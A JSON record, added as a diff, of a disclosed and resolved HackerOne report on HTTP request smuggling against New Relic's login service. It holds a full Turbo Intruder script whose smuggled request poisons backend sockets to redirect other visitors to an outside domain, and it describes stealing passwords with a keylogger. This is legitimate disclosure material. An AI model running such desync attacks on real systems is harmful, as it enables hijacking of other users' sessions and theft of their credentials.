@@ -1,0 +1,146 @@
+{
+  "id": 498052,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTgwNTI=",
+  "url": "https://hackerone.com/reports/498052",
+  "title": "Password theft login.newrelic.com via Request Smuggling",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-02-19T14:10:14.035Z",
+  "submitted_at": "2019-02-19T14:10:14.035Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "albinowax",
+    "url": "/albinowax",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-08-30T01:06:43.632Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-08-29T15:47:08.262Z",
+  "team_member_agreed_on_going_public_at": "2019-08-30T01:06:43.510Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nThe Rails application at login.newrelic.com is accessed through a proxy written in Golang, and an nginx server. By sending an ambiguous request, an attacker can desynchronize these servers, leaving the socket to the backend poisoned with a harmful response. This response will then be served up to the next visitor. \n\nThe desync occurs when sending a request with a Content-Length header and a valid Transfer-Encoding header followed by an invalid Transfer-Encoding header. The Golang proxy only examines the second Transfer-Encoding which is invalid, so it uses the Content-Length instead. However the nginx server prioritises the valid Transfer-Encoding header and therefore ignores the Content-Length.\n\n\nTo replicate this issue, run the following script in Turbo Intruder. It issues the desync request, and then simulates 10 requests from normal visitors. It's quite unreliable as it may poison another visitor instead of your own requests, but you should see that one of the victim requests gets a 301 response which redirects to https://skeletonscribe.net/. This script targets staging-login.newrelic.com: to avoid having an impact on the production environment.\n\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint='https://staging-login.newrelic.com:443',\n                           concurrentConnections=5,\n                           requestsPerConnection=5,\n                           pipeline=False,\n                           maxRetriesPerRequest=0\n                           )\n\n    attack = '''POST /login HTTP/1.1\nHost: staging-login.newrelic.com\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nCookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; _mkto_trk=id:412-MZS-894&token:_mch-newrelic.com-1547216493639-15775; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; ei_client_id=5c39274682f6eb000fa6d52a; _golden_gate_session=bkRPMUZ3STBrY0laZG0zemY1Umg5cFVhcWpNaGpvZWN2T0tOM3hWL2p2UVdaVTJLZFh5NkJtQnZHV2FIR3hnZWpKaWFvM2F2WkRab3hjWTd5b3A1T2dOY20zWWNQaFhZNWVRZXFuRkFwU3l1YVZMdm1JSW9pSGd0UnRicnRBUVdhaGg3UXJQTFJ0c3ZkMHRyaHZqNjYreCt4dWUwVlp1UTdrSVFpSEx6akVITjRWWGNrSUR5NGdIdG80UnFJS2xpVTNlU1BpK0hjWEZJMVF1R2I4RlNNeUdicVdTWFVDQnBlQ0NQSXdNYXFJM2lDTWc5VldLOTJ3N1A3Wll5RytpZVNya2J1WTdTNUZ5UVFRNk5KVmt2TmNudlU3WDFQMVJPbGtkWXJJWXd1YjA9LS1MeU1EbTkrZ29qVVo2VkNUMDhnMVp3PT0%3D--155cef8a5f5d2bcb69b1d1952af040a3479aeacb; _gat=1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 189\nTransfer-Encoding: chunked\nTransfer-Encoding: foo\n\n3e\nreturn_to=https%3A%2F%2Fstaging-insights-embed.newrelic.com%2F\n0\n\nGET / HTTP/1.1\nHost: staging-login.newrelic.com:123\nX-Forwarded-Host: skeletonscribe.net\nContent-Length: 10\n\nx='''\n    engine.queue(attack)\n    engine.start()\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n    if req.code == 200:\n        victim = '''GET /?x= HTTP/1.1\nHost: staging-login.newrelic.com\nConnection: close\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3508.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nCookie: optimizelyEndUserId=oeu1547215128308r0.023321653201122228; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%22a5f7b9bb-8c8a-4add-ac69-75200d4c46cb%22; TSNGUID=6093d809-7d9d-4d52-bfb9-335de9fb69b8; _ga=GA1.2.1374597116.1547216490; _gid=GA1.2.1093027572.1547216490; _gcl_au=1.1.1026642629.1547216493; __qca=P0-235566894-1547221374728; intercom-id-cyym0u3i=bd3a0989-6e9f-4e6d-a497-9a41ef6d5290; _fbp=fb.1.1547249472663.621468648; _gat=1; _mkto_trk=id:697-KKO-240&token:_mch-newrelic.com-1547216493639-15775; _golden_gate_session=dWUvd1NFRVJRN051UUg0K245YWxPZ3NleGdQNFBPbXZLRS84WElQZFdSS3g1d28xNXBTb0RKZXNQeEFLSm4zeE9yeTJia1lxNGRPUWhPZFhXYVY1eGM1emMyTGZvZmVzcHNsby85UEJqbXViK3E4SHNRSVllT0lCSk4zUzdWNW5ic1MzNVNqSStaeW5qblM2dERuUWN5Wml0ZzYwd1BkU256UVpmM1JtdjN6S01taTFLM3VCMGNuWi96NmhPc3JBLS1BRlZ4dis4MTVxZ0NjblZpVlgvVmdRPT0%3D--ab2b42c56157e42752d86deb9e03f18946a4d5c5; ei_client_id=5c3929f2857699000fe7bcc5\n\n'''\n\n        for i in range(10):\n            req.engine.queue(victim)\n```\n            \nSince this technique allows attackers to bypass rules in frontend systems, it may also be possible to access internal content that's meant to be private.\n\n## Impact\n\nBy redirecting javascript imports to a malicious domain, an attacker can inject a keylogger and steal user passwords from your login page. This attack requires no user interaction",
+  "bounty_amount": "3000.0",
+  "formatted_bounty": "$3,000",
+  "weakness": {
+    "id": 86,
+    "name": "HTTP Request Smuggling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-09-28T15:47:08.359Z",
+  "allow_singular_disclosure_after": -138144660.50752565,
+  "singular_disclosure_allowed": true,
+  "vote_count": 489,
+  "voters": [
+    "nohats",
+    "k3v1nx_",
+    "webhak",
+    "sgabe",
+    "honoki",
+    "mirchr",
+    "dark_haxor",
+    "djcater",
+    "chux",
+    "wi11",
+    "and 479 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 17016,
+    "asset_type": "URL",
+    "asset_identifier": "login.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 18067,
+      "category": "researcher",
+      "content": "I've posted a writeup of this exploit and others using the same technique at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn\n\n**Warning**: Do not copy the Turbo Intruder attack script used in this report. Because `requestsPerConnection` is not set to 1, it can cause false positives on non-vulnerable targets",
+      "user": {
+        "id": 56414,
+        "username": "albinowax",
+        "name": "James Kettle",
+        "bio": "@albinowax",
+        "cleared": true,
+        "verified": true,
+        "website": "https://skeletonscribe.net/",
+        "location": "United Kingdom",
+        "created_at": "2016-02-15T11:34:15.992Z",
+        "url": "https://hackerone.com/albinowax",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
